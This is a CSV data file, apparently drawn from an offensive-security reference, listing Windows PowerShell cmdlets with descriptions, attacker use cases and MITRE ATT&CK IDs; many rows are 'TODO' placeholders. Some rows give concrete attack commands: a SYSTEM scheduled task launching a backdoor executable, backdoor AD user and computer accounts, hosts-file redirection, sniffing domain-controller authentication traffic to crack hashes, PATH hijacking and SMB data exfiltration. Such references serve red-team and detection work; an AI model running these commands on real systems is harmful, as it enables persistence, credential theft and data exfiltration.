"Name","Description","Updated","Toolsets","Commands","Commands_Command","Commands_Description","Commands_Usecases","Commands_Function","Commands_Comments","Commands_MitreAttack","Resources","Detections","Contributors","Contributors_Name","Contributors_Handle","Detections_Port","is_legit"
"Remove-FileShare","Removes a file share","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Remove-FileShare -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Remove-DhcpServerv4Lease","Deletes the specified IPv4 address lease record from the Dynamic Host Configuration Protocol (DHCP) server service","2023-07-01","[''CIMSession''-|-''TODO'']","","Remove-DhcpServerv4Lease -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DhcpServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Remove-ADUser","Removes an Active Directory user","2023-07-01","[''RSAT''-|-''TODO'']","","Remove-ADUser","TODO","None","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Register-ScheduledTask","Registers a scheduled task definition on a local computer","2023-07-01","[''Builtin''-|-''CIMSession'']","","$a = New-ScheduledTaskAction -Execute ""C:\Tmp\backdoor.exe"" -Argument '-background' $p = New-ScheduledTaskPrincipal -UserId ""NT Authority\SYSTEM"" $ss = New-ScheduledTaskSettingsSet -MultipleInstances Parallel -AllowStartIfOnBatteries -Compatibility Win8 New-ScheduledTask -CimSession $s -Action $a -Principal $p -Settings $ss $t = Register-ScheduledTask -CimSession $s Backdoor -InputObject $d","Create new scheduled task","Persistence","Execute","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `ScheduledTasks`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Register-CimIndicationEvent","Subscribes to indications using a filter expression or a query expression","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Register-CimIndicationEvent -CimSession $s","TODO","None","Execute","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `CimCmdlets`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Publish-DscConfiguration","Publishes a DSC configuration to a set of computers","2023-07-01","[''Builtin''-|-''TODO'']","","Publish-DscConfiguration","TODO","None","Manage","PowerShell Module: `PSDesiredStateConfiguration`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Out-File","Sends output to a file","2023-07-01","Builtin","","""10.0.10.123 legit.com"" | Out-File -Append \\W10.ad.bitsadmin.com\C$\Windows\System32\Drivers\etc\hosts -Encoding ascii","Append line to file","Add name to target host file to point to a malicious IP","Data","None","None","None","None","","Arris Huijgen","bitsadmin","","false"
"New-WSManInstance","Creates a new instance of a management resource","2023-07-01","[''Builtin''-|-''TODO'']","","New-WSManInstance","TODO","None","Manage","PowerShell Module: `Microsoft.WSMan.Management`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"New-VirtualDiskSnapshot","Creates a new snapshot of the specified virtual disk","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","New-VirtualDiskSnapshot -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"New-VirtualDisk","Creates a new virtual disk in the specified storage pool","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","New-VirtualDisk -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"New-SmbShare","Creates an SMB share","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","New-SmbShare -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `SmbShare`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"New-ScheduledTask","Creates a scheduled task instance","2024-12-13","[''Builtin''-|-''CIMSession'']","","$a = New-ScheduledTaskAction -Execute ""C:\Tmp\backdoor.exe"" -Argument '-background' $p = New-ScheduledTaskPrincipal -UserId ""NT Authority\SYSTEM"" $ss = New-ScheduledTaskSettingsSet -MultipleInstances Parallel -AllowStartIfOnBatteries -Compatibility Win8 $d = New-ScheduledTask -CimSession $s -Action $a -Principal $p -Settings $ss $t = Register-ScheduledTask -CimSession $s Backdoor -InputObject $d","Create new scheduled task","None","Execute","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''See [Register-ScheduledTask](../Register-ScheduledTask)''-|-''PowerShell Module: `ScheduledTasks`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"New-PSSession","Creates a persistent connection to a local or remote computer","2023-08-25","[''Builtin''-|-''PSSession'']","","[''$ps = New-PSSession -ComputerName W10.ad.bitsadmin.com''-|-''$ps = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri http://exch2019.ad.bitsadmin.com/PowerShell/ -Authentication Kerberos'']","[''Connect to WinRM''-|-''Manage Microsoft Exchange Server'']","[''None''-|-''None'']","[''Execute''-|-''Manage'']","[''Next, for example use [Enter-PSSession](../Enter-PSSession) to interactively enter the session or [Invoke-Command](../Invoke-Command) to execute a command in the session''-|-''Might require use of OffensiveDC in case error `ERROR_WSMAN_CLIENT_WORKGROUP_NO_KERBEROS` is returned on a non-domain joined machine'']","[''T1021.006''-|-''T1021.006'']","None","None","","Arris Huijgen","bitsadmin","","false"
"New-NetRoute","Creates a route in the IP routing table","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","New-NetRoute -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetTCPIP`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"New-NetNat","Creates a NAT object","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","New-NetNat -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetNat`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"New-NetFirewallRule","Creates a new inbound or outbound firewall rule and adds the rule to the target computer","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","New-NetFirewallRule -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `netsecurity`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"New-NetEventSession","Creates a network event session","2023-07-01","[''Builtin''-|-''CIMSession'']","","New-NetEventSession -Name sess -CimSession $s -LocalFilePath ""C:\Windows\Temp\Trace.etl"" -CaptureMode SaveToFile Add-NetEventPacketCaptureProvider -SessionName sess -CimSession $s -Level 4 -CaptureType Physical Start-NetEventSession -Name sess -CimSession $s Get-NetEventSession -Name sess -CimSession $s  Stop-NetEventSession -Name sess -CimSession $s Remove-NetEventSession -Name sess -CimSession $s Move-Item \\DC1.ad.bitsadmin.com\C$\Windows\Temp\Trace.etl C:\tmp","Sniff traffic","Sniff authentication traffic on a domain controller and locally crack the hashes","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Convert resulting `.etl` file to `.pcapng` using `etl2pcapng`''-|-''PowerShell Module: `NetEventPacketCapture`'']","T1047","https://github.com/microsoft/etl2pcapng","None","","Arris Huijgen","bitsadmin","","false"
"New-GPO","Creates a GPO","2023-07-01","[''RSAT''-|-''TODO'']","","New-GPO -Name RunImmediateScheduledTask","Create new GPO","Create new GPO which runs an immediate scheduled task to deploy an implant on the computers in the OU it is linked to","Domain","PowerShell Module: `GroupPolicy`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"New-GPLink","Links a GPO to a site, domain, or OU","2023-07-01","[''RSAT''-|-''TODO'']","","New-GPLink","TODO","None","Domain","PowerShell Module: `GroupPolicy`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"New-EtwTraceSession","Creates an ETW trace session","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","New-EtwTraceSession -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `EventTracingManagement`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"New-CimSession","Creates a CIM session","2023-07-01","[''Builtin''-|-''CIMSession'']","","[''$s = New-CimSession -ComputerName W10.ad.bitsadmin.com''-|-''$so = New-CimSessionOption -Protocol Dcom -Authentication Kerberos $s = New-CimSession -ComputerName W10.ad.bitsadmin.com -SessionOption $so '']","[''Creates a CIM session over WinRM''-|-''Creates a CIM session over RPC'']","[''Connect to remote machine to perform activities using the various WMI classes''-|-''Connect to remote machine to perform activities using the various WMI classes'']","[''Manage''-|-''Manage'']","[''There are various other options for the `-Authentication` parameter that can be used''-|-''There are various other options for the `-Authentication` parameter that can be used'']","[''T1047''-|-''T1021.006''-|-''T1047'']","None","None","","Arris Huijgen","bitsadmin","","false"
"New-CimInstance","Creates a CIM instance","2023-07-01","[''Builtin''-|-''CIMSession'']","","New-CimInstance -ClassName Win32_Environment -Property @{Name=""testvar"";VariableValue=""testvalue"";UserName=""<SYSTEM>""} -CimSession $s","Create new instance","Change PATH environment variable for search order hijacking","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `CimCmdlets`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"New-ADUser","Creates a new Active Directory user","2023-07-01","RSAT","","New-ADUser -Name ""Backdoor"" -AccountPassword (ConvertTo-SecureString ""MyPassword!"" -Force -AsPlainText) -Enabled $true","Create new user","Create backdoor user in the AD","Domain","PowerShell Module: `ActiveDirectory`","T1136.002","None","None","","Arris Huijgen","bitsadmin","","false"
"New-ADServiceAccount","Creates a new Active Directory managed service account or group managed service account object","2023-07-01","[''RSAT''-|-''TODO'']","","New-ADServiceAccount","TODO","None","Domain","PowerShell Module: `ActiveDirectory`","T1136.002","None","None","","Arris Huijgen","bitsadmin","","false"
"New-ADOrganizationalUnit","Creates a new Active Directory organizational unit","2023-07-01","RSAT","","New-ADOrganizationalUnit -Name GPO_Test -Path ""OU=Azure,OU=Servers,DC=ad,DC=bitsadmin,DC=com""","Create new OU","Create new OU for a simulated ransomware attack","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"New-ADObject","Creates an Active Directory object","2023-07-01","[''RSAT''-|-''TODO'']","","New-ADObject","TODO","None","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"New-ADGroup","Creates an Active Directory group","2023-07-01","[''RSAT''-|-''TODO'']","","New-ADGroup","TODO","None","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"New-ADComputer","Creates a new Active Directory computer","2023-07-01","RSAT","","$account = 'MyComputer' $password = 'Password1!' $domain = 'ad.bitsadmin.com' New-ADComputer -Name $account -SAMAccountName $account -AccountPassword (ConvertTo-SecureString $password -Force -AsPlainText) -Verbose -DNSHostName ""$account.$domain"" -ServicePrincipalNames @(""HOST/$account.$domain"",""RestrictedKrbHost/$account.$domain"",""HOST/$account"",""RestrictedKrbHost/$account"")","Create computer account","Create backdoor user in the AD","Domain","[''Can be performed by a regular user''-|-''By default the attribute `ms-DS-MachineAccountQuota` (global setting) is set to 10 for all domain users''-|-''PowerShell Module: `ActiveDirectory`'']","T1136.002","None","None","","Arris Huijgen","bitsadmin","","false"
"Move-Item","Moves an item from one location to another","2023-07-01","[''Builtin''-|-''PSSession'']","","Move-Item -Path \\FS01.ad.bitsadmin.com\Users\AllUsers.zip .","Exfiltrate data","Exfiltrate data over SMB","Data","[''Create PSSession `$ps` using [New-PSSession](../New-PSSession/)''-|-''PowerShell Module: `Microsoft.PowerShell.Management`'']","T1021.002","None","None","","Arris Huijgen","bitsadmin","","false"
"Mount-DiskImage","Mounts a previously created disk image (virtual hard disk or ISO), making it appear as a normal disk","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Mount-DiskImage -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Invoke-WSManAction","Invokes an action on the object that is specified by the Resource URI and by the selectors","2023-07-01","Builtin","","","Execute binary","Launch implant","Execute","PowerShell Module: `Microsoft.WSMan.Management`","[''T1047''-|-''T1059.001'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Invoke-Command","Runs commands on local and remote computers","2023-07-01","[''Builtin''-|-''PSSession'']","","[''Invoke-Command -ComputerName W10.ad.bitsadmin.com { Get-NetAdapter }''-|-''Invoke-Command -Session $ps { Get-NetAdapter }'']","[''Runs command''-|-''Runs command'']","[''None''-|-''None'']","[''Execute''-|-''Execute'']","[''Create PSSession `$ps` using [New-PSSession](../New-PSSession/)''-|-''PowerShell Module: `Microsoft.PowerShell.Core`''-|-''Create PSSession `$ps` using [New-PSSession](../New-PSSession/)''-|-''PowerShell Module: `Microsoft.PowerShell.Core`'']","[''T1021.006''-|-''T1059.001''-|-''T1021.006''-|-''T1059.001'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Invoke-CimMethod","Invokes a method of a CIM class","2023-07-01","[''Builtin''-|-''CIMSession'']","","[''Get-CimInstance -Namespace root/CIMV2/TerminalServices -ClassName Win32_TerminalServiceSetting | Invoke-CimMethod -MethodName SetAllowTSConnections -Arguments @{AllowTSConnections=1; ModifyFirewallException=1}''-|-''Invoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=""Software\Policies\Microsoft\Windows NT\Terminal Services""; sValueName=""Shadow""; uValue=[uint32]2} -CimSession $s'']","[''Invoke a method on a CIM instance''-|-''Invoke a static method on a CIM class''-|-''Invoke a static method on a CIM class'']","[''Enable Remote Desktop Services''-|-''Set registry value''-|-''Launch implant'']","[''Manage''-|-''Registry''-|-''Execute'']","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `CimCmdlets`''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `CimCmdlets`''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `CimCmdlets`'']","[''T1047''-|-''T1112''-|-''T1047'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Install-WindowsFeature","Installs one or more roles, role services, or features on either the local or a specified remote server that is running Windows Server 2012 R2","2023-07-01","[''RSAT''-|-''TODO'']","","Install-WindowsFeature","TODO","None","Manage","PowerShell Module: `ServerManager`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-WindowsFeature","Gets information about Windows Server roles, role services, and features that are available for installation and installed on a specified server","2023-07-01","[''RSAT''-|-''TODO'']","","Get-WindowsFeature","TODO","None","Manage","PowerShell Module: `ServerManager`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-WinEvent","Gets events from event logs and event tracing log files on local and remote computers","2024-12-13","Builtin","","[''Get-WinEvent -ComputerName DC1.ad.bitsadmin.com -FilterHashtable @{logname=""Security"";id=4768} | % { [PSCustomObject]@{TimeCreated=$_.TimeCreated; TargetUserName=$_.Properties[0].Value; TargetDomainName=$_.Properties[1].Value; TargetSid=$_.Properties[2].Value; ServiceName=$_.Properties[3].Value; ServiceSid=$_.Properties[4].Value; TicketOptions=$_.Properties[5].Value; Status=$_.Properties[6].Value; TicketEncryptionType=$_.Properties[7].Value; PreAuthType=$_.Properties[8].Value; IpAddress=$_.Properties[9].Value; IpPort=$_.Properties[10].Value; CertIssuerName=$_.Properties[11].Value; CertSerialNumber=$_.Properties[12].Value; CertThumbprint=$_.Properties[13].Value} }''-|-''Get-WinEvent -ComputerName DC1.ad.bitsadmin.com -LogName 'Security' -FilterXPath ""*[System[(EventID=4768)]] and *[EventData[Data[@Name='TargetUserName']='SomeAdmin']]""''-|-''Get-WinEvent -ComputerName W10.ad.bitsadmin.com -FilterHashtable @{logname=""Security"";id=4624} | % { [PSCustomObject]@{TimeCreated=$_.TimeCreated; SubjectUserSid=$_.Properties[0].Value; SubjectUserName=$_.Properties[1].Value; SubjectDomainName=$_.Properties[2].Value; SubjectLogonId=$_.Properties[3].Value; TargetUserSid=$_.Properties[4].Value; TargetUserName=$_.Properties[5].Value; TargetDomainName=$_.Properties[6].Value; TargetLogonId=$_.Properties[7].Value; LogonType=$_.Properties[8].Value; LogonProcessName=$_.Properties[9].Value; AuthenticationPackageName=$_.Properties[10].Value; WorkstationName=$_.Properties[11].Value; LogonGuid=$_.Properties[12].Value; TransmittedServices=$_.Properties[13].Value; LmPackageName=$_.Properties[14].Value; KeyLength=$_.Properties[15].Value; ProcessId=$_.Properties[16].Value; ProcessName=$_.Properties[17].Value; IpAddress=$_.Properties[18].Value; IpPort=$_.Properties[19].Value; ImpersonationLevel=$_.Properties[20].Value; RestrictedAdminMode=$_.Properties[21].Value; TargetOutboundUserName=$_.Properties[22].Value; TargetOutboundDomainName=$_.Properties[23].Value; VirtualAccount=$_.Properties[24].Value; TargetLinkedLogonId=$_.Properties[25].Value; ElevatedToken=$_.Properties[26].Value;} }''-|-''Get-WinEvent -ListLog * -ComputerName DC1.ad.bitsadmin.com'']","[''List all Kerberos authentication requests''-|-''Based on TGT request identify from which IP a user is authenticating''-|-''List logons on a system''-|-''Check which logs are enabled by viewing the number of records per log'']","[''Identify which IPs logons of privileged users are originating from''-|-''Identify which IP a privileged user is originating from''-|-''Understand which accounts are used on a system''-|-''None'']","[''Logs''-|-''Logs''-|-''Logs''-|-''Logs'']","[''PowerShell Module: `Microsoft.PowerShell.Diagnostics`''-|-''PowerShell Module: `Microsoft.PowerShell.Diagnostics`''-|-''PowerShell Module: `Microsoft.PowerShell.Diagnostics`''-|-''PowerShell Module: `Microsoft.PowerShell.Diagnostics`'']","[''None''-|-''None''-|-''None''-|-''None'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-WSManInstance","Displays management information for a resource instance specified by a Resource URI","2023-07-01","Builtin","","Get-WSManInstance -ConnectionURI http://W10.ad.bitsadmin.com:5985/wsman shell -Enumerate","List WSMan connections","Identify which WSMan sessions are currently active and from where","Sessions","PowerShell Module: `Microsoft.WSMan.Management`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-VpnConnection","Retrieves the specified VPN connection profile information","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-VpnConnection -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: VpnClient'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-Volume","Gets the specified Volume object, or all Volume objects if no filter is provided","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-Volume -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-VirtualDisk","Returns a list of VirtualDisk objects, across all storage pools, across all providers, or optionally a filtered subset based on provided criteria","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-VirtualDisk -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-VM","Gets the virtual machines from one or more Hyper-V hosts","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-VM -CimSession $s","List VMs","Reconnaissance on VMs running on a Hyper-V server","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Hyper-V`'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-SmbShare","Retrieves the SMB shares on the computer","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-SmbShare -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `SmbShare`'']","[''T1135''-|-''T1047'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-SmbSession","Retrieves information about the SMB sessions that are currently established between the SMB server and the associated clients","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-SmbSession -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `SmbShare`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-SmbServerConfiguration","Retrieves the SMB server configuration","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-SmbServerConfiguration -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `SmbShare`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-SmbOpenFile","Retrieves basic information about the files that are open on behalf of the clients of the SMB server","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-SmbOpenFile -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `SmbShare`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-SmbConnection","Retrieves the connections established from the SMB client to the SMB servers","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-SmbConnection -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `SmbShare`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-Service","Gets the services on a local or remote computer","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-Service -ComputerName W10.ad.bitsadmin.com","List services","Reconnaissance on installed services","Processes","Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ScheduledTaskInfo","Gets run-time information for a scheduled task","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-ScheduledTaskInfo -CimSession $s -TaskName '\Microsoft\Windows\DiskCleanup\CleanupBackdoor'","List details on scheduled task execution","Determine past executions of implant","Processes","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `ScheduledTasks`'']","[''T1053.005''-|-''T1047'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-ScheduledTask","Gets the task definition object of a scheduled task that is registered on the local computer","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-ScheduledTask -CimSession $s | % { [PSCustomObject]@{State=$_.State; TaskName=$_.TaskName; TaskPath=$_.TaskPath; Actions=$($a=$_.Actions;$($a.Id,$a.WorkingDirectory,$a.Execute,$a.Arguments).Where({$_ -ne $null}) -join "" ""); Author=$_.Author; Description=$_.Description; SecurityDescriptor=$_.SecurityDescriptor } }","List details on scheduled tasks","Reconnaissance","Processes","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `ScheduledTasks`'']","[''T1053.005''-|-''T1047'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-RemoteAccess","Displays the configuration of DirectAccess (DA) and VPN (both Remote Access VPN and site-to-site VPN)","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-RemoteAccess -CimSession $s","TODO","None","Processes","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: RemoteAccess'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-Process","Gets the processes that are running on the local computer or a remote computer.","2023-07-01","Builtin","","Get-Process -ComputerName DC1.ad.bitsadmin.com","List processes","Reconnaissance on running processes","Processes","None","T1057","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-Printer","Retrieves a list of printers installed on a computer","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-Printer -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: PrintManagement'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-PhysicalDisk","Gets a list of all PhysicalDisk objects visible across any available Storage Management Providers, or optionally a filtered list","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-PhysicalDisk -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-Partition","Returns a list of all partition objects visible on all disks, or optionally a filtered list using specified parameters","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-Partition -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-OdbcDsn","Gets ODBC DSNs","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Get-OdbcDsn -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: Wdac'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NfsShare","Gets NFS shares on an NFS server","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-NfsShare -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: NFS'']","[''T1135''-|-''T1047'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NfsSession","Gets information about which client computers are currently connected to one or more shares on an NFS server","2023-07-01","[''CIMSession''-|-''TODO'']","","Get-NfsSession -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: NFS'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetUDPEndpoint","Gets current UDP endpoint statistics","2023-07-01","[''Builtin''-|-''CIMSession'']","","Get-NetUDPEndpoint -CimSession $s","Enumerate listening UDP ports","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetTCPIP`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Get-NetTCPConnection","Gets TCP connections","2023-07-01","[''Builtin''-|-''CIMSession'']","","[''Get-NetTCPConnection -CimSession $s -State Listen''-|-''Get-NetTCPConnection -CimSession $s -State Established'']","[''Enumerate listening TCP ports''-|-''List established connections'']","[''Recon on listening services''-|-''Recon on current network and Internet activity'']","[''Network''-|-''Network'']","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetTCPIP`''-|-''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetTCPIP`'']","[''T1047''-|-''T1047'']","None","None","","Arris Huijgen","bitsadmin","","false"
